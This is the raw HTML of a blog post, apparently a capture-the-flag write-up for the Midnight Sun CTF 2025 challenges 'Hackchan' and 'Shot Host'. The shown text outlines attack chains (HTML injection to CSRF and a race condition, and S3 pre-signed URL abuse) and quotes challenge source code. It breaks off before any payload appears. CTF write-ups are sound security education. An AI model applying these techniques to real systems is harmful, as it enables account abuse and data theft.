@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.5991d603939a6d188be342b278a4555db90f163903158c623d2c39fde3d82cb3.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/avatar.jpg>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">ZePacifist&#39;s Blog - Midnight Sun CTF 2025 Quals - Hackchan, Shot Host</title>
+<meta property="og:title" content=ZePacifist&#39;s&#32;Blog&#32;-&#32;Midnight&#32;Sun&#32;CTF&#32;2025&#32;Quals&#32;-&#32;Hackchan,&#32;Shot&#32;Host />
+<meta name="twitter:title" content=ZePacifist&#39;s&#32;Blog&#32;-&#32;Midnight&#32;Sun&#32;CTF&#32;2025&#32;Quals&#32;-&#32;Hackchan,&#32;Shot&#32;Host />
+<meta itemprop="name" content=ZePacifist&#39;s&#32;Blog&#32;-&#32;Midnight&#32;Sun&#32;CTF&#32;2025&#32;Quals&#32;-&#32;Hackchan,&#32;Shot&#32;Host />
+<meta name="application-name" content=ZePacifist&#39;s&#32;Blog&#32;-&#32;Midnight&#32;Sun&#32;CTF&#32;2025&#32;Quals&#32;-&#32;Hackchan,&#32;Shot&#32;Host />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="/posts/midnight-sun2025/" />
+<link rel="canonical" href="/posts/midnight-sun2025/" itemprop="url" />
+<meta name="url" content="/posts/midnight-sun2025/" />
+<meta name="twitter:url" content="/posts/midnight-sun2025/" />
+<meta property="og:url" content="/posts/midnight-sun2025/" />
+
+
+<meta property="og:updated_time" content="2025-05-18T19:05:22&#43;05:30" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+  
+    <meta name="twitter:site" content="@ZePacifist" />
+    <meta name="twitter:creator" content="@ZePacifist" />
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.147.3">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="/">
+                <img src="/images/avatar.jpg" alt="brand image">
+            </a>
+        
+        
+            <a href="/">
+                <h1>ZePacifist&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    CTF writeups and maybe more
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/midnight-sun2025/">Midnight Sun CTF 2025 Quals - Hackchan, Shot Host</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/requirednotes-bi0sctf2024/">Required Notes - bi0sCTF 2024</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/awesomenotes2-hackluctf2023/">Awesomenotes II - Hack.lu CTF 2023</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Ze-Pacifist">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/ZePacifist">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+
+    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/p/ZPacifist">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
+            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="RSS Feed" href="/posts/index.xml">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
+            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
+                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
+                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
+                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
+            </g>
+        </svg>
+    </a>
+
+
+
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2025 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="/posts/midnight-sun2025/">Midnight Sun CTF 2025 Quals - Hackchan, Shot Host</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-05-18T19:05:22&#43;0530" class="post-date">
+        May 18, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>12 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-web">
+        <a href="/tags/web">web</a>
+      </li>
+      
+      <li class="tag-csrf">
+        <a href="/tags/csrf">csrf</a>
+      </li>
+      
+      <li class="tag-cloud">
+        <a href="/tags/cloud">cloud</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p><strong>tl;dr</strong></p>
+<ul>
+<li>Writeup for &ldquo;Hackchan&rdquo; and &ldquo;Shot Host&rdquo; from MidnightSun CTF Quals.</li>
+<li>Hackchan - html injection -&gt; meta redirect -&gt; CSRF -&gt; Race Condition</li>
+<li>Shot Host - Use lambda function to sign <code>x-amz-copy-source</code> header into S3 pre-signed URL to copy png containing flag.</li>
+</ul>
+<h1 id="introduction">Introduction</h1>
+<p>This is a writeup for two of the challenges that I worked on during the <a href="https://play.midnightsunctf.com/challenges" target="_blank">Midnight Sun CTF 2025 Quals</a> - Hackchan and Shot Host. I&rsquo;ll be walking through my approach towards the challenges during the CTF and also try to cover various solutions shared other players in the <a href="https://discord.gg/xMuRxub4CX" target="_blank">discord server</a> post CTF.</p>
+<h2 id="hackchan">Hackchan</h2>
+<p><strong>Challenge points</strong>: 200
+<strong>No. of solves</strong>: 41</p>
+<h3 id="challenge-description">Challenge Description</h3>
+<p>Hackchan is your friendly neighborhood grocery store, with an exclusive loyalty program where points can be redeemed for amazing rewards. The system is said to be bulletproof, but there are whispers of a vulnerability that would allow one into the Billionaire Club by obtaining one billion loyalty points in their Hackchan account.
+Tags - clientside, python, web</p>
+<h3 id="analysis">Analysis</h3>
+<p>We are given a <a href="https://s3.eu-north-1.amazonaws.com/dl.hfsc.tf/hackchan_3b560b75.tar.gz" target="_blank">download link</a> and a URL to access the <a href="https://hackchan-mjk2mpay.ctf.pro/" target="_blank">challenge</a>. On the given website, we have the option to register and login as a new user. Once logged in, we have access to a few functionalities or actions as seen in the get parameter <code>?action=something</code>. Since we have access to the source code, we can take a look at that to better understand the application.</p>
+<p>There are three services running as per the docker-compose file - web, admin-user and postgres.</p>
+<ol>
+<li>postgres is initialized with <code>init.db</code> which contains table schema, product data and also a default user manager with balance of 999999999</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> users (username, password, is_manager, balance) <span style="color:#66d9ef">VALUES</span>
+</span></span><span style="display:flex;"><span>    (<span style="color:#e6db74">&#39;manager&#39;</span>, <span style="color:#e6db74">&#39;********REDACTED********&#39;</span>, <span style="color:#66d9ef">true</span>, <span style="color:#ae81ff">999999999999</span>);
+</span></span></code></pre></div><ol start="2">
+<li>admin-user is the admin bot which navigates to <code>http://web:8000</code> and performs the following actions</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#e6db74">&#39;http://web:8000/&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">fill</span>(<span style="color:#e6db74">&#39;#username&#39;</span>, <span style="color:#e6db74">&#39;manager&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">fill</span>(<span style="color:#e6db74">&#39;#password&#39;</span>, <span style="color:#e6db74">&#39;********REDACTED********&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">click</span>(<span style="color:#e6db74">&#39;[type=&#34;submit&#34;]&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#e6db74">&#39;http://web:8000/?action=order-problems&#39;</span>);
+</span></span><span style="display:flex;"><span>
